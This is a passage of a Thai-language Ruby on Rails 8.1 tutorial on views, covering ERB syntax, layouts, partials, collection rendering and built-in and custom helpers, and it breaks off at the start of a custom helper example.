# Part 024: View — ERB, Layout, Partial, Helper, View ที่ Reuse ได้

> **Step ครอบคลุมใน Part นี้:** Step 231–240
> **ระดับ:** เริ่มต้น–กลาง (ต่อจาก Part 023 เรื่อง Controller)
> **เวอร์ชันที่ใช้:** Ruby 3.3.x / Rails 8.1.x (Propshaft เป็น asset pipeline, importmap-rails
> สำหรับ JavaScript — รายละเอียดเชิงลึกของ asset pipeline จะพูดถึงใน Part 029)

ใน Part 023 เราเรียนไปแล้วว่า Controller รับ request, จัดการ `params`, `session`, `flash`
แล้วส่งข้อมูลต่อไปให้ **View** เพื่อ render เป็น HTML กลับไปหา browser ใน Part นี้เราจะเจาะลึก
ฝั่ง View ทั้งหมด — ตั้งแต่ syntax ของ ERB, การจัดโครงสร้าง layout, การแตกโค้ด HTML ที่ซ้ำซ้อน
ออกเป็น partial ที่ reuse ได้, การเขียน helper method ของตัวเอง, ไปจนถึงเรื่องความปลอดภัย
เบื้องต้นของการแสดงผลข้อมูลที่มาจากผู้ใช้

## สารบัญของ Part นี้

- Step 231: ERB คืออะไร — `<%= %>` vs `<% %>` และ comment ใน ERB
- Step 232: View lookup convention — controller#action หา template อย่างไร
- Step 233: Layout — `app/views/layouts/application.html.erb` และ `yield`
- Step 234: ส่งข้อมูลจาก Controller ไป View — instance variable vs `locals:`
- Step 235: Partial — แตกโค้ด view ที่ซ้ำออกมาเป็นชิ้นเล็กๆ
- Step 236: Partial + Collection — render ทับ list ข้อมูลอย่างมีประสิทธิภาพ
- Step 237: View Helper มาตรฐานของ Rails
- Step 238: เขียน Custom Helper ของตัวเองใน `app/helpers/`
- Step 239: `content_for` และ `yield(:name)` — แทรกเนื้อหาเฉพาะจุดใน layout
- Step 240: Escaping, `html_safe`/`raw` และการเขียน View ให้ "โง่" (dumb)
- แบบฝึกหัด: หน้ารายชื่อทีม (Team Roster) แบบ reuse ได้ทั้งระบบ

---

## Step 231: ERB คืออะไร — `<%= %>` vs `<% %>` และ comment ใน ERB

**ERB** (Embedded RuBy) คือ template engine เริ่มต้นของ Rails ที่ให้เราเขียนโค้ด Ruby
แทรกอยู่ในไฟล์ HTML ได้ ไฟล์ view ของ Rails ที่ใช้ ERB จะมีนามสกุล `.html.erb`

ERB มี tag หลักอยู่ 3 แบบที่ต้องจำให้แม่น:

| Tag | ความหมาย | ตัวอย่างการใช้ |
|-----|----------|----------------|
| `<%= ... %>` | รันโค้ด Ruby แล้ว **แสดงผลลัพธ์** ออกมาเป็น HTML | `<%= @post.title %>` |
| `<% ... %>` | รันโค้ด Ruby เฉยๆ **ไม่แสดงผลลัพธ์** | `<% if @post.published? %>` |
| `<%# ... %>` | comment — ไม่ถูก render ออกมาเลย | `<%# TODO: เพิ่ม pagination %>` |

### ตัวอย่างพื้นฐาน

```erb
<%# app/views/greetings/hello.html.erb %>

<h1>สวัสดี, <%= @name %>!</h1>

<% if @name.present? %>
  <p>ยินดีต้อนรับกลับมา</p>
<% else %>
  <p>กรุณาเข้าสู่ระบบ</p>
<% end %>

<p>วันนี้คือ <%= Date.today.strftime("%d/%m/%Y") %></p>
```

ข้อสังเกตสำคัญ: บล็อก `<% if %> ... <% end %>` **ไม่มี** `=` เพราะ `if/end` ไม่ได้คืนค่าที่เรา
ต้องการพิมพ์ออกมาตรงๆ (มันแค่ควบคุม flow) แต่เนื้อหาข้างในอย่าง `<p>...</p>` เป็น HTML ธรรมดา
ที่ ERB จะพิมพ์ผ่านไปตามปกติอยู่แล้ว ส่วน `<%= @post.title %>` มี `=` เพราะเราต้องการให้ค่า
ที่ method คืนมาถูกแสดงผลจริงๆ

**กฎการเลือกใช้ที่พลาดบ่อยสำหรับมือใหม่:** ถ้าลืมใส่ `=` ในจุดที่ควรมี ผลลัพธ์จะหายไปเฉยๆ
โดยไม่มี error (เพราะ `<% %>` แค่รันโค้ดแล้วทิ้งค่า) แต่ถ้าใส่ `=` เกินในจุดที่ไม่ควรมี เช่น
`<%= if @post.published? %>` จะทำให้ error เพราะ `if` แบบไม่มี `else` คืนค่า `nil` เข้าไปแทรกใน
HTML และในบางเวอร์ชันของ ERB parser จะ syntax error เพราะไม่มี `%>` ปิด `if` block ให้ถูกต้อง

### ตัดช่องว่าง (whitespace) ด้วย `<%-` และ `-%>`

ERB ปกติจะพิมพ์บรรทัดว่างที่เหลือจาก `<% %>` ออกมาด้วย (เห็นเป็นบรรทัดว่างเยอะๆ ใน HTML source
ที่ browser ไม่สนใจ แต่ดู source ไม่สวย) ใช้ `<%-` และ `-%>` เพื่อตัด whitespace ส่วนเกินออก:

```erb
<ul>
  <% @tags.each do |tag| -%>
  <li><%= tag %></li>
  <% end -%>
</ul>
```

ในทางปฏิบัติ ทีมส่วนใหญ่ไม่ค่อยซีเรียสเรื่องนี้เพราะ HTML ที่มี whitespace เยอะไม่กระทบ
การทำงานของ browser เลย จะสนใจก็ต่อเมื่อทำงานกับ `<pre>` หรือ inline element ที่ whitespace
มีผลต่อการแสดงผลจริง (เช่น `<span>` ติดกันหลายตัว)

### รูปแบบไฟล์ view: `<format>.<handler>`

ชื่อไฟล์ `index.html.erb` แยกออกเป็น 2 ส่วนหลัง `index`:

- `.html` คือ **format** — Rails รองรับหลาย format (`.html`, `.json`, `.js`, `.xml`, ...)
- `.erb` คือ **handler** — ตัวประมวลผล template (ทางเลือกอื่นคือ `.builder` สำหรับ XML,
  หรือ `.jbuilder` สำหรับ JSON ซึ่งจะพูดถึงในเฟส API ช่วงหลัง)

การแยกสองส่วนนี้ทำให้ Rails รู้ว่าไฟล์ไหนควรใช้ตอบ request แบบไหน เช่นถ้ามีทั้ง
`index.html.erb` และ `index.json.jbuilder` อยู่ในโฟลเดอร์เดียวกัน controller เดียวกันก็จะ
render คนละไฟล์ขึ้นกับว่า client ขอ format อะไรมา (ผ่าน header `Accept` หรือ `.json` ต่อท้าย
URL)

---

## Step 232: View lookup convention — controller#action หา template อย่างไร

นี่คือ **Convention over Configuration** ที่สำคัญที่สุดอย่างหนึ่งของ Rails ฝั่ง View: ถ้า
action ใน controller ไม่ได้เรียก `render` แบบระบุชื่อไฟล์เอง Rails จะพยายามหา template ที่ตรง
กับชื่อ controller และชื่อ action โดยอัตโนมัติ

```
controller_name#action_name
      ↓
app/views/controller_name/action_name.html.erb
```

ตัวอย่างเช่น:

```ruby
# app/controllers/posts_controller.rb
class PostsController < ApplicationController
  def index
    @posts = Post.all
    # ไม่มีการเรียก render! Rails จะหา app/views/posts/index.html.erb ให้เอง
  end

  def show
    @post = Post.find(params[:id])
    # หา app/views/posts/show.html.erb
  end
end
```

### ถ้าไม่มี template รอรับ — เกิดอะไรขึ้น

ทดสอบจริงบน Rails 8.1: ถ้า action ไม่มี template และ request มา format `*/*` (เช่นจาก
`curl` ธรรมดาไม่ระบุ header) Rails จะตอบ `204 No Content` เงียบๆ พร้อม log ว่า
`No template found for TeamsController#index, rendering head :no_content` แต่ถ้า request
ระบุ `Accept: text/html` ชัดเจน (เหมือนที่ browser จริงส่งมาเสมอ) Rails จะโยน exception
`ActionView::MissingTemplate` ทันที พร้อมหน้า error ที่บอกรายชื่อโฟลเดอร์ที่มันค้นหาไปแล้ว —
เป็นข้อความ error ที่มีประโยชน์มากตอน debug ปัญหา "ทำไมหน้าเว็บไม่ขึ้น"

### Render แบบระบุชื่อ template เอง

บางครั้งเราต้องการ render template อื่นที่ไม่ตรงกับชื่อ action ตรงๆ เช่น action `create`
ที่ล้มเหลว (validation ไม่ผ่าน) มักจะ render กลับไปหน้า `new`:

```ruby
def create
  @post = Post.new(post_params)
  if @post.save
    redirect_to @post
  else
    render :new, status: :unprocessable_entity
  end
end
```

หรือ render template จาก controller อื่นข้ามโฟลเดอร์:

```ruby
render "admin/posts/show"       # ใช้ path เต็ม ต้องมี "/" คั่น
render template: "admin/posts/show"  # เขียนแบบ explicit key ก็ได้ความหมายเดียวกัน
```

หรือ render string/inline โดยไม่มีไฟล์เลย (ใช้น้อยมากในโปรเจกต์จริง ส่วนใหญ่ใช้ตอน debug หรือ
ตอบ API แบบง่ายๆ):

```ruby
render plain: "OK"
render html: "<strong>Hello</strong>".html_safe
render json: { status: "ok" }
```

> **ข้อควรระวัง:** เรียก `render` หรือ `redirect_to` ได้แค่ครั้งเดียวต่อ 1 action ถ้าเรียกซ้ำ
> (เช่นลืมใส่ `return` หลัง `render` ใน `if` block) จะได้ error
> `AbstractController::DoubleRenderError` — เจอบ่อยมากตอนมือใหม่เขียน conditional render/redirect

---

## Step 233: Layout — `app/views/layouts/application.html.erb` และ `yield`

**Layout** คือ template ที่ครอบ (wrap) เนื้อหาของทุกหน้าในเว็บแอปเดียวกัน เช่น `<head>`,
navbar, footer ที่ต้องซ้ำทุกหน้า Rails จะ render layout ก่อน แล้วเอาผลลัพธ์ของ view ปกติ (เช่น
`posts/index.html.erb`) ไปแทรกตรงจุดที่เขียนว่า `<%= yield %>`

นี่คือไฟล์ `app/views/layouts/application.html.erb` ที่ `rails new` สร้างให้อัตโนมัติใน
Rails 8.1 (ทดสอบจริงด้วย `rails new myapp --minimal`):

```erb
<!DOCTYPE html>
<html>
  <head>
    <title><%= content_for(:title) || "MyApp" %></title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="application-name" content="MyApp">
    <meta name="mobile-web-app-capable" content="yes">
    <%= csrf_meta_tags %>
    <%= csp_meta_tag %>

    <%= yield :head %>

    <link rel="icon" href="/icon.png" type="image/png">
    <link rel="icon" href="/icon.svg" type="image/svg+xml">
    <link rel="apple-touch-icon" href="/icon.png">

    <%# Includes all stylesheet files in app/assets/stylesheets %>
    <%= stylesheet_link_tag :app %>
  </head>

  <body>
    <%= yield %>
  </body>
</html>
```

สังเกตว่า Rails 8.1 ใส่ `content_for(:title)` และ `yield :head` มาให้ตั้งแต่ generate แอปใหม่
เลย — แปลว่าทีมงาน Rails เองก็ถือว่า pattern นี้เป็นมาตรฐานที่ควรมีตั้งแต่ต้น (เราจะเจาะลึก
`content_for` ใน Step 239)

- `<%= yield %>` (ไม่มี argument) คือจุดที่เนื้อหาหลักของแต่ละหน้า (เช่น
  `posts/index.html.erb`) จะถูกแทรกเข้ามา
- `<%= csrf_meta_tags %>` และ `<%= csp_meta_tag %>` เป็น helper ที่ฝัง token ป้องกัน CSRF
  attack (จะเจาะลึกใน Part 079 เรื่อง Security)
- `<%= stylesheet_link_tag :app %>` โหลดไฟล์ CSS ผ่าน Propshaft (asset pipeline ของ Rails 8)
  — ไม่ต้องกังวลรายละเอียดตอนนี้ เดี๋ยวเจาะลึกใน Part 029

### ลอง render จริง

ด้วย controller และ view ง่ายๆ:

```ruby
# app/controllers/teams_controller.rb
class TeamsController < ApplicationController
  def index
    @team_name = "Rails Warriors"
  end
end
```

```erb
<%# app/views/teams/index.html.erb %>
<h1><%= @team_name %></h1>
```

ผลลัพธ์ HTML ที่ได้จริง (ตัด head บางส่วนออก) จะเป็น:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>MyApp</title>
    ...
  </head>
  <body>
    <h1>Rails Warriors</h1>
  </body>
</html>
```

`<h1>Rails Warriors</h1>` มาจาก `teams/index.html.erb` ที่ถูกแทรกลงในตำแหน่ง `<%= yield %>`
ของ layout พอดี

### กำหนด Layout เฉพาะ Controller หรือปิด Layout

ถ้าไม่ระบุอะไรเลย Rails จะใช้ `app/views/layouts/application.html.erb` เป็นค่า default
เสมอ แต่เปลี่ยนได้:

```ruby
class Admin::DashboardController < ApplicationController
  layout "admin"   # ใช้ app/views/layouts/admin.html.erb แทน
end

class ReportsController < ApplicationController
  def export
    render layout: false   # ไม่ครอบ layout เลย เช่นตอบเป็น partial สำหรับ AJAX/Turbo Frame
  end
end
```

`layout` ยังรับ symbol เป็นชื่อ method หรือ Proc เพื่อเลือก layout แบบมีเงื่อนไขได้ (เช่น
สลับ layout ตามว่า login อยู่หรือไม่) — ในโปรเจกต์ทั่วไปที่ไม่ซับซ้อนมาก layout เดียวก็มักจะ
พอสำหรับทั้งแอป โดยใช้ partial แยกส่วนที่ต่างกันแทน (จะพูดใน Step 235)

---

## Step 234: ส่งข้อมูลจาก Controller ไป View — instance variable vs `locals:`

### แบบดั้งเดิม: Instance Variable (`@variable`)

Rails เชื่อม controller กับ view เข้าด้วยกันด้วยกลไกพิเศษ: **instance variable** ทุกตัวที่
ตั้งค่าไว้ใน action จะ "มองเห็น" ได้จากใน view โดยอัตโนมัติ โดยไม่ต้องส่งผ่าน argument ใดๆ

```ruby
class PostsController < ApplicationController
  def show
    @post = Post.find(params[:id])
    @related_posts = Post.where(category: @post.category).limit(3)
  end
end
```

```erb
<%# app/views/posts/show.html.erb — เข้าถึง @post, @related_posts ได้ทันที %>
<h1><%= @post.title %></h1>
<p><%= @post.body %></p>

<h2>บทความที่เกี่ยวข้อง</h2>
<% @related_posts.each do |post| %>
  <p><%= post.title %></p>
<% end %>
```

กลไกเบื้องหลังคือ Rails คัดลอกค่า instance variable ทั้งหมดจาก controller object ไปตั้งไว้ใน
view object (ที่จริงคือ `ActionView::Base` instance) ก่อน render — นี่คือเหตุผลที่ตัวแปรที่
"ลืม" declare ไว้ใน action (พิมพ์ผิดชื่อ) จะไม่ error แต่ได้ `nil` เงียบๆ แทน (เป็นข้อเสียของ
กลไกนี้ — ผิดพลาดจับได้ยากกว่าการส่ง argument ตรงๆ)

### แบบที่ Rails สมัยใหม่แนะนำมากขึ้น: `render ... locals:`

เมื่อ render template หรือ partial แบบระบุชื่อเอง เราส่งข้อมูลแบบ **explicit** ผ่าน
`locals:` ได้ ซึ่งชัดเจนกว่าและตรวจสอบง่ายกว่า (ตัวแปรที่ไม่ได้ส่งมาจะ raise error ทันทีถ้า
เรียกใช้ในเทมเพลต แทนที่จะเงียบเป็น `nil`)

```ruby
def show
  post = Post.find(params[:id])
  render "posts/show", locals: { post: post, related_posts: post.related_posts }
end
```

```erb
<%# ใช้ local variable "post" ตรงๆ ไม่ใช้เครื่องหมาย @ %>
<h1><%= post.title %></h1>
<p><%= post.body %></p>
```

ข้อดีของแนวทาง `locals:`:

1. **Explicit dependency** — เปิดไฟล์ template ขึ้นมาก็รู้ทันทีว่ามันต้องการตัวแปรอะไรบ้าง
   จาก parameter list ไม่ต้องไล่อ่าน controller action ทั้งหมด
2. **พิมพ์ผิดชื่อ = error ทันที** ไม่ใช่ `nil` เงียบๆ (ช่วยจับบั๊กเร็วขึ้นมาก)
3. **Reuse ง่ายกว่า** — เทมเพลตเดียวกันสามารถถูกเรียกจาก action ไหนก็ได้ ขอแค่ส่ง local ที่
   ตรงกัน ไม่ผูกติดกับชื่อ instance variable ของ controller ตัวใดตัวหนึ่ง

ในทางปฏิบัติ: การ render หน้าเต็ม (action ปกติ) ส่วนใหญ่ยังใช้ instance variable ตามธรรมเนียม
Rails ทั่วไปเพราะ Rails "จับคู่" ให้อัตโนมัติอยู่แล้ว แต่ **partial แทบทุกตัวควรรับข้อมูลผ่าน
`locals:` เสมอ** — จะอธิบายเหตุผลชัดเจนขึ้นใน Step 235–236

### กำหนดค่า default ให้ local variable ของ partial

Partial (และ template ที่ระบุ `locals:`) กำหนดค่า default ให้ local ที่อาจไม่ถูกส่งมาได้ด้วย
`local_assigns`:

```erb
<%# app/views/shared/_alert.html.erb %>
<% type = local_assigns.fetch(:type, :info) %>
<div class="alert alert-<%= type %>">
  <%= message %>
</div>
```

```erb
<%= render "shared/alert", message: "บันทึกสำเร็จ" %>
<%# type จะได้ default เป็น :info %>

<%= render "shared/alert", message: "เกิดข้อผิดพลาด", type: :danger %>
```

---

## Step 235: Partial — แตกโค้ด view ที่ซ้ำออกมาเป็นชิ้นเล็กๆ

**Partial** คือไฟล์ view ย่อยที่ตั้งชื่อขึ้นต้นด้วย underscore (`_`) เสมอ (แต่เวลาเรียกใช้ผ่าน
`render` **ไม่ต้อง** ใส่ underscore) มีไว้แตกส่วนของ HTML/ERB ที่ซ้ำกันหลายหน้าออกมาเป็นไฟล์
เดียว แล้วเรียกใช้ซ้ำได้จากหลายที่ — ตรงตามหลัก DRY (Don't Repeat Yourself)

### ตัวอย่างพื้นฐาน

```erb
<%# app/views/posts/_form_errors.html.erb %>
<% if post.errors.any? %>
  <div class="error-box">
    <h3><%= pluralize(post.errors.count, "ข้อผิดพลาด") %></h3>
    <ul>
      <% post.errors.full_messages.each do |message| %>
        <li><%= message %></li>
      <% end %>
    </ul>
  </div>
<% end %>
```

เรียกใช้จากหน้า `new` และ `edit` (ที่มักจะมี error box แบบเดียวกัน):

```erb
<%# app/views/posts/new.html.erb %>
<h1>เขียนบทความใหม่</h1>
<%= render "form_errors", post: @post %>
<%= render "form", post: @post %>

<%# app/views/posts/edit.html.erb %>
<h1>แก้ไขบทความ</h1>
<%= render "form_errors", post: @post %>
<%= render "form", post: @post %>
```

ข้อสังเกต:

- ไฟล์จริงชื่อ `_form_errors.html.erb` แต่เรียกด้วย `render "form_errors"` (ตัด `_` ออก)
- ส่งข้อมูลเข้าไปแบบ key-value ต่อท้าย (`post: @post`) — นี่คือรูปแบบย่อของ
  `render partial: "form_errors", locals: { post: @post }` เขียนแบบเต็มก็ได้ผลลัพธ์เดียวกัน
- **Partial ไม่ควรพึ่ง instance variable ของ controller โดยตรง** ควรรับทุกอย่างผ่าน local
  variable ที่ระบุตอนเรียก `render` เท่านั้น เพื่อให้ partial เรียกใช้ได้จาก controller ไหน
  ก็ได้โดยไม่ผูกติดกับชื่อ `@post` ที่ตายตัว

### Partial ข้ามโฟลเดอร์ (shared partial)

Partial ที่ใช้ร่วมกันหลาย controller มักเก็บไว้ในโฟลเดอร์ `app/views/shared/`:

```erb
<%# app/views/shared/_pagination.html.erb %>
<nav class="pagination">
  <% if current_page > 1 %>
    <%= link_to "« ก่อนหน้า", url_for(page: current_page - 1) %>
  <% end %>
  <span>หน้า <%= current_page %> จาก <%= total_pages %></span>
  <% if current_page < total_pages %>
    <%= link_to "ถัดไป »", url_for(page: current_page + 1) %>
  <% end %>
</nav>
```

```erb
<%# ใช้จากหน้าไหนก็ได้ ระบุ path เต็มคั่นด้วย "/" %>
<%= render "shared/pagination", current_page: @page, total_pages: @total_pages %>
```

### Layout ก็เป็นเพียง partial พิเศษ — และเรียก partial ซ้อนใน partial ได้

Partial เรียก partial อื่นซ้อนกันได้ตามปกติ (nested partials) เช่น navbar partial ที่เรียก
menu-item partial ข้างในอีกที ไม่มีข้อจำกัดเรื่องความลึก แต่ในทางปฏิบัติควรระวังไม่ให้ซ้อนลึก
เกินไป (2–3 ชั้นถือว่าปกติ เกินกว่านั้นมักเป็นสัญญาณว่าควรจัดโครงสร้างใหม่)

---

## Step 236: Partial + Collection — render ทับ list ข้อมูลอย่างมีประสิทธิภาพ

Pattern ที่เจอบ่อยที่สุดคือการ loop แสดงรายการข้อมูล (เช่น list โพสต์, list สินค้า) ด้วย
partial ตัวเดียวต่อ 1 รายการ Rails มี syntax เฉพาะสำหรับกรณีนี้ที่ **เร็วกว่า** การเขียน
`each` เอง

### วิธีที่ไม่ควรทำ (แม้จะได้ผลลัพธ์เหมือนกัน)

```erb
<% @posts.each do |post| %>
  <%= render "post", post: post %>
<% end %>
```

โค้ดนี้ใช้งานได้ปกติ แต่ Rails ต้อง compile/lookup ไฟล์ partial ใหม่ทุกรอบของ loop

### วิธีที่แนะนำ: `render partial:, collection:`

```erb
<%= render partial: "post", collection: @posts, as: :post %>
```

Rails จะ compile partial แค่ครั้งเดียวแล้ววนแทรกข้อมูลแต่ละตัวเข้าไป **เร็วกว่าเวอร์ชัน
`each` ธรรมดาอย่างมีนัยสำคัญ** เมื่อจำนวนรายการเยอะ (เช่นหลักร้อยขึ้นไป) — จาก log จริงตอน
ทดสอบใน Rails 8.1 development environment จะเห็นบรรทัดพิเศษยืนยันว่า Rails รู้ว่านี่คือ
collection render:

```
Rendered collection of teams/_member.html.erb [3 times] (Duration: 0.4ms | GC: 0.0ms)
```

`as: :post` กำหนดชื่อ local variable ที่ partial จะใช้เรียกแต่ละ element — จริงๆ แล้ว
**ไม่จำเป็นต้องระบุก็ได้** เพราะค่า default คือชื่อไฟล์ partial เอง (ไฟล์ `_post.html.erb` จะ
ได้ local ชื่อ `post` โดยอัตโนมัติ) ระบุ `as:` เมื่อต้องการเปลี่ยนชื่อให้สื่อความหมายกว่าเดิม
เท่านั้น เช่น:

```erb
<%= render partial: "member", collection: @team.members, as: :member %>
```

### รูปย่อสุด: `render @posts`

ถ้า element ในคอลเลกชันเป็น **ActiveRecord model** (หรือ object ที่ include
`ActiveModel::Naming`/`ActiveModel::Conversion` ซึ่งมี method `#to_partial_path`) เขียนย่อ
ได้อีก:

```erb
<%= render @posts %>
<%# เทียบเท่ากับ render partial: "posts/post", collection: @posts %>
```

Rails จะเดา path ของ partial จากชื่อ class ของแต่ละ object เอง (`Post` → `posts/_post`)

> **ทดสอบจริงแล้วพบ gotcha สำคัญ:** ถ้าลองใช้ `render @members` กับ object ที่เป็น plain
> Ruby object (เช่น `Struct.new(:name, :role)` ธรรมดาที่ยังไม่ได้ทำเป็น ActiveRecord model)
> จะได้ error ทันที:
> ```
> ActionView::Template::Error ('#<struct Member name="สมชาย"...>' is not an
> ActiveModel-compatible object. It must implement #to_partial_path.)
> ```
> เพราะ Rails ไม่รู้ว่าจะแปลง object ธรรมดาเป็นชื่อ partial ยังไง **บทเรียน:** รูปย่อ
> `render @collection` ใช้ได้เฉพาะกับ ActiveRecord model (หรือ object ที่ implement
> `to_partial_path` เอง) เท่านั้น — ถ้าข้อมูลเป็น Hash/Struct/PORO ธรรมดา ให้ใช้รูปเต็ม
> `render partial: "...", collection: ...` เสมอ ซึ่งใช้ได้กับข้อมูลทุกชนิดไม่มีข้อจำกัดนี้

### ตัวนับลำดับ (counter) ในการวน collection

Rails เพิ่ม local variable พิเศษชื่อ `<partial_name>_counter` ให้อัตโนมัติ (เริ่มนับจาก 0)
มีประโยชน์เวลาต้องการเลขลำดับ หรือ styling แบบสลับสี (zebra stripe):

```erb
<%# app/views/posts/_post.html.erb %>
<div class="post <%= 'post--even' if post_counter.even? %>">
  <span>#<%= post_counter + 1 %></span>
  <h3><%= post.title %></h3>
</div>
```

### แสดงข้อความเมื่อ collection ว่างเปล่า

ถ้า collection ว่าง `render partial:, collection:` จะคืนค่า `nil` เงียบๆ (ไม่ error ไม่แสดง
อะไร) นิยมใช้ `||` เพื่อแสดงข้อความสำรอง:

```erb
<%= render(partial: "post", collection: @posts) || render("empty_state") %>
```

หรือใช้ option `collection:` ร่วมกับตรวจสอบ `.any?` ก่อนตามสไตล์ที่อ่านง่ายกว่า:

```erb
<% if @posts.any? %>
  <%= render partial: "post", collection: @posts %>
<% else %>
  <p class="empty">ยังไม่มีบทความในตอนนี้</p>
<% end %>
```

---

## Step 237: View Helper มาตรฐานของ Rails

**Helper** คือ method ที่มีไว้ช่วยสร้าง HTML หรือ format ข้อมูลให้อ่านง่ายขึ้น เรียกใช้ได้ตรงๆ
ใน view (และใน controller/mailer บางส่วนผ่าน `helpers.xxx`) Rails มากับ helper สำเร็จรูป
จำนวนมาก ตัวที่ใช้บ่อยที่สุด:

### `link_to` — สร้าง `<a>` tag

```erb
<%= link_to "ไปหน้าแรก", root_path %>
<%# => <a href="/">ไปหน้าแรก</a> %>

<%= link_to "ไปหน้าแรก", root_path, class: "btn btn-primary" %>
<%# => <a class="btn btn-primary" href="/">ไปหน้าแรก</a> %>

<%# ส่ง block แทน string แรกได้ เมื่อเนื้อหาใน link ซับซ้อนกว่าข้อความล้วน %>
<%= link_to root_path, class: "card" do %>
  <img src="/icon.png" alt="โลโก้">
  <span>กลับหน้าแรก</span>
<% end %>
```

**สำคัญสำหรับ Rails 8 (ต่างจากบทความเก่าที่อาจยังสอน `method: :delete`):** ตั้งแต่ Rails 7
เป็นต้นมา `rails-ujs` ถูกถอดออกจาก default stack แล้ว แทนที่ด้วย **Turbo** ดังนั้นปุ่มลบที่
ต้องส่ง HTTP method อื่นจาก GET (ผ่าน link) ต้องใช้ `data: { turbo_method: ... }` แทน
`method:` แบบเก่า:

```erb
<%# วิธีที่ถูกต้องบน Rails 8.1 %>
<%= link_to "ลบ", post_path(@post),
      data: { turbo_method: :delete, turbo_confirm: "ยืนยันการลบบทความนี้?" },
      class: "btn btn-danger" %>
```

### `image_tag` — สร้าง `<img>` tag

```erb
<%= image_tag "logo.png", alt: "โลโก้บริษัท" %>
<%# => <img src="/assets/logo-<hash>.png" alt="โลโก้บริษัท"> %>

<%= image_tag "logo.png", alt: "โลโก้", width: 120, height: 40, class: "rounded" %>
```

ไฟล์รูปต้องอยู่ใน `app/assets/images/` (Propshaft จะจัดการ path/fingerprint ให้เอง — ลึกกว่า
นี้ใน Part 029) ถ้าไม่พบไฟล์ Propshaft จะ raise `Propshaft::MissingAssetError` ทันทีตอน
render (ทดสอบแล้ว) ซึ่งช่วยจับปัญหา "ลืมใส่ไฟล์รูป" ได้เร็วกว่าปล่อยให้ `<img>` เสียเงียบๆ

### `content_tag` และ `tag.xxx` — สร้าง HTML tag แบบ dynamic

```erb
<%= content_tag(:span, "ใหม่", class: "badge") %>
<%# => <span class="badge">ใหม่</span> %>

<%# รูปแบบสมัยใหม่ที่กระชับกว่า (แนะนำให้ใช้ในโค้ดใหม่) %>
<%= tag.span "ใหม่", class: "badge" %>
<%= tag.div class: "card" do %>
  <p>เนื้อหาข้างใน div</p>
<% end %>
```

### `truncate` — ตัดข้อความยาวๆ ให้สั้นลง

```erb
<%= truncate(@post.body, length: 100) %>
<%# ถ้ายาวเกิน 100 ตัวอักษร จะตัดแล้วเติม "..." ต่อท้าย %>

<%= truncate(@post.body, length: 100, omission: " (อ่านต่อ...)") %>
```

> **ทดสอบจริงกับข้อความภาษาไทย พบข้อควรระวัง:** `truncate` นับความยาวเป็น "ตัวอักษร"
> (Unicode codepoint) ไม่ใช่ "grapheme cluster" ภาษาไทยหลายตัวอักษรประกอบจากพยัญชนะ + สระ/
> วรรณยุกต์ที่เป็นคนละ codepoint กัน (เช่น "สวัสดี" ประกอบจากหลาย codepoint ซ้อนกัน) ถ้าจุดตัด
> ไปตกกลางกลุ่มอักขระผสมพอดี ผลลัพธ์ยังเป็น UTF-8 ที่ถูกต้องเสมอ แต่ตัวอักษรตัวสุดท้ายอาจแสดง
> ผลเพี้ยน (เช่น สระ/วรรณยุกต์ลอยไม่มีพยัญชนะรองรับ) วิธีแก้ที่ปฏิบัติได้จริงคือเผื่อความยาว
> ให้มากกว่าที่ต้องการเล็กน้อย หรือตัดที่ขอบเว้นวรรค/ประโยคแทนการตัดกลางคำเป๊ะๆ

### `number_to_currency`, `number_with_delimiter` — format ตัวเลข

```erb
<%= number_to_currency(1234.5) %>
<%# => $1,234.50 (default locale เป็น USD) %>

<%= number_to_currency(1234.5, unit: "฿", format: "%u%n") %>
<%# => ฿1,234.50 — format "%u%n" ควบคุมลำดับหน่วยเงินกับตัวเลข %>

<%= number_with_delimiter(1_234_567) %>
<%# => 1,234,567 %>
```

(การตั้งค่า locale ให้ format เป็นแบบไทยทั้งแอปอัตโนมัติ จะพูดถึงใน Part 039 เรื่อง I18n)

### `pluralize` — ผันคำนามให้ถูกต้องตามจำนวน

```erb
<%= pluralize(1, "post") %>   <%# => 1 post %>
<%= pluralize(5, "post") %>   <%# => 5 posts %>
```

> **ทดสอบจริงแล้วพบ gotcha ที่สำคัญมากสำหรับภาษาไทย:** `pluralize` ออกแบบมาสำหรับภาษาอังกฤษ
> ที่คำนามผันรูปเมื่อจำนวน ≠ 1 (เติม `s` ให้อัตโนมัติถ้าไม่ระบุ `plural:`) ภาษาไทยไม่มีการผัน
> คำนามแบบนี้ ถ้าเขียน `pluralize(3, "คน")` แบบไม่ระวัง จะได้ผลลัพธ์ผิดเป็น **"3 คนs"**
> (มี "s" แปลกปลอมต่อท้าย) วิธีใช้ที่ถูกต้องสำหรับภาษาไทยคือต้องระบุ `plural:` เป็นคำเดิมเสมอ:
> ```erb
> <%= pluralize(@members.size, "คน", plural: "คน") %>
> <%# => 3 คน (ถูกต้อง) %>
> ```
> หรือถ้าไม่ต้องการพึ่ง helper นี้เลยเพราะภาษาไทยไม่มีปัญหาการผันคำ ก็เขียนตรงๆ ง่ายกว่า:
> `"#{@members.size} คน"`

### Helper อื่นๆ ที่ควรรู้จักไว้ (ใช้บ่อยรองลงมา)

```erb
<%= simple_format(@post.body) %>
<%# แปลง \n\n เป็น <p> ใหม่ และ \n เดี่ยวเป็น <br> — เหมาะกับ textarea ที่ยังไม่ใช้ rich editor %>

<%= time_ago_in_words(@post.created_at) %> ที่แล้ว
<%# => "3 days ago ที่แล้ว" (ต้องตั้ง locale ไทยถึงจะได้ "3 วันที่แล้ว" เต็มรูป — Part 039) %>

<%= sanitize(@post.body_html) %>
<%# ทำความสะอาด HTML ที่อาจเป็นอันตราย ก่อนแสดงผล (เกี่ยวโยงกับ Step 240) %>
```

---

## Step 238: เขียน Custom Helper ของตัวเองใน `app/helpers/`

เมื่อ generate controller ใหม่ Rails มักจะสร้างไฟล์ helper คู่กันให้อัตโนมัติ เช่น
`bin/rails generate controller Teams` จะได้ `app/helpers/teams_helper.rb` มาด้วย

```ruby
# app/helpers/teams_helper.rb
module TeamsHelper
end
```

**ทุก helper module ที่อยู่ใน `app/helpers/` จะถูก include เข้าไปใน view ของ "ทุก" controller
โดยอัตโนมัติ** (ไม่ใช่แค่ controller ที่ชื่อตรงกับ helper) — Rails include helper ทั้งหมดแบบ
global โดย default เพื่อความสะดวก แต่ก็หมายความว่าเราควรตั้งชื่อ method ในนั้นให้เฉพาะเจาะจง
พอที่จะไม่ชนกับ helper module อื่น

### ตัวอย่าง: helper แสดง badge ตามสถานะ/บทบาท

```ruby
